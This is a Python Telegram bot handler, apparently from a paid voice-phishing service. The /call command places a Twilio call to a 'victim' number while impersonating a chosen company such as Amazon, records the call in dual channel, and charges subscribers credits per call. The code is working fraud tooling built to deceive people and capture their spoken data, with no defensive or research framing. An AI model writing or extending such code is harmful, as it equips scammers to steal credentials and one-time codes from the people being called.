from telebot.types import Message
from twilio.rest import Client
from config import bot, TWILIO_SID, TWILIO_TOKEN, TWILIO_NUMBER, TWILIO_APP_URL, PRICING, ADMIN_IDS
from database import check_subscription, deduct_balance, get_user_balance

# Initialize Twilio Client
twilio_client = None
if TWILIO_SID and TWILIO_TOKEN:
    try: 
        twilio_client = Client(TWILIO_SID, TWILIO_TOKEN)
    except: 
        pass

@bot.message_handler(commands=['call'])
def handle_call(message: Message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cost = PRICING["call"]
    
    # 1. SECURITY CHECK (Subscription)
    if user_id not in ADMIN_IDS:
        if not check_subscription(user_id):
            return bot.reply_to(message, "💎 **Premium Feature:** Access denied. Buy a plan at /start.")
    
    # 2. WALLET CHECK (Cobrar)
    if not deduct_balance(user_id, cost):
        current = get_user_balance(user_id)
        return bot.reply_to(message, 
            f"💸 **Insufficient Credits!**\n\n"
            f"📞 Call Cost: `${cost}`\n"
            f"💰 Your Balance: `${current}`\n\n"
            f"Please redeem a new key to top up.")

    # 3. TWILIO CHECK
    if not twilio_client: 
        return bot.reply_to(message, "❌ **System Error:** Twilio is not configured.")
    
    # 4. FORMAT CHECK
    args = message.text.split()
    if len(args) < 3: 
        return bot.reply_to(message, "⚠️ **Usage:** `/call [number] [service]`\n\nExample: `/call +13055550100 Amazon`", parse_mode="Markdown")
    
    target = args[1]
    service = " ".join(args[2:])
    
    # 5. EXECUTE CALL
    try:
        msg = bot.reply_to(message, f"🔄 **Connecting to {service}...**", parse_mode="Markdown")
        
        twiml_url = f"{TWILIO_APP_URL}/twilio/voice?service={service}&user_id={user_id}"
        status_callback_url = f"{TWILIO_APP_URL}/twilio/status?user_id={user_id}"

        call = twilio_client.calls.create(
            to=target, 
            from_=TWILIO_NUMBER, 
            url=twiml_url, 
            method='POST',
            record=True,
            recording_channels='dual',
            status_callback=status_callback_url, 
            status_callback_event=['initiated', 'ringing', 'answered', 'completed'],
            time_limit=120  # <--- 🛡️ SEGURIDAD: CORTA A LOS 120 SEGUNDOS (2 MIN)
        )
        
        bot.edit_message_text(
            f"📞 **Calling Victim...**\n\n"
            f"🎯 Target: `{target}`\n"
            f"🏢 Service: `{service}`\n"
            f"💰 Cost: `${cost}`\n"
            f"⏱ Limit: `2 Minutes`\n"
            f"🔴 **Recording:** ON\n\n"
            f"_⚠️ Waiting for answer..._", 
            chat_id=chat_id,
            message_id=msg.message_id,
            parse_mode="Markdown"
        )
        
    except Exception as e:
        # Opcional: Reembolsar si falla
        # add_balance(user_id, cost)
        error_msg = str(e)
        if "unverified" in error_msg.lower():
            bot.reply_to(message, "❌ **Twilio Trial Error:** You can only call verified numbers.")
        else:
            bot.reply_to(message, f"❌ **Call Failed:** `{error_msg}`", parse_mode="Markdown")